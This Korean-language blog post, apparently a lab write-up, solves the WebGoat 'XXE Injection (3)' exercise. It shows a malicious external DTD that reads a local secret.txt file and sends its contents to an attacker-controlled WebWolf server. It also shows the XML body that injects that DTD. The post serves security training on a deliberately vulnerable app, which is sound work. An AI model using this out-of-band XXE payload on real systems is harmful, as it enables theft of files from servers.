---
layout: post
title: WebGoat - XXE Injection (3)
date: 2021-01-13 22:00:00 +0900
category: Web_Hacking
---

# WebGoat - XXE Injection (3)

#### DTD 파일을 작성하여 공격자(WebWolf)서버에 "~/.webgoat/plugin/XXE/secret.txt" 파일 업로드하기

<br/>

> XXE(XML eXternal Entity) Injection이란 XML이 외부 엔티티를 포함하고 있을 때, 이를 이용하여 기밀 데이터 유출, DoS 등을 유발하는 공격이다.

<br/>

secret.txt 파일의 경로는 다음과 같다.

![webgoat_xxe3_1](/public/img/webgoat_xxe3_1.PNG)

<br/>

댓글을 작성한 후 Burp Suite를 통해 보면 Content-Type이 application/xml인 것을 알 수 있고, 이를 통해 body 부분이 XML형식으로 전송된다는 것을 알 수 있다.

![webgoat_xxe3_2](/public/img/webgoat_xxe3_2.PNG)

![webgoat_xxe3_3](/public/img/webgoat_xxe3_3.PNG)

<br/>

먼저 다음과 같이 "attack.dtd" 파일을 생성한 후 WebWolf 서버에 업로드해보자.

```shell
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % open SYSTEM "file:///c:/Users/USER/.webgoat-8.0.0.M24/XXE/secret.txt">
<!ENTITY % unzip "<!ENTITY run SYSTEM 'http://127.0.0.1:9090/landing?rst=%open;'>">
%unzip;
```

![webgoat_xxe3_4](/public/img/webgoat_xxe3_4.PNG)

![webgoat_xxe3_5](/public/img/webgoat_xxe3_5.PNG)

<br/>

그리고 link를 복사한다.

```shell
http://127.0.0.1:9090/files/root123/attack.dtd
```

<br/>

이제 body 부분을 다음과 같이 변경하여 Injection을 시도하자.

```shell
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE comment [
<!ENTITY % setDtd SYSTEM "http://127.0.0.1:9090/files/root123/attack.dtd">
%setDtd;
]>
<comment>
<text>&run;</text>
</comment>
```

![webgoat_xxe3_6](/public/img/webgoat_xxe3_6.PNG)

</br>

그러자 이전처럼 댓글에 모든 내용이 보여지는 것이 아니라 빈 댓글이 달렸다. 그 이유는 WebWolf에 기록하도록 설정했기 때문이다.

![webgoat_xxe3_7](/public/img/webgoat_xxe3_7.PNG)

<br/>

이제 WebWolf의 landing 페이지에 가서 rst 파라미터를 통해 secret.txt를 확인해보자.

![webgoat_xxe3_8](/public/img/webgoat_xxe3_8.PNG)

<br/>

해당 내용을 복사한 후 댓글에 작성하면 정답이다.

![webgoat_xxe3_9](/public/img/webgoat_xxe3_9.PNG)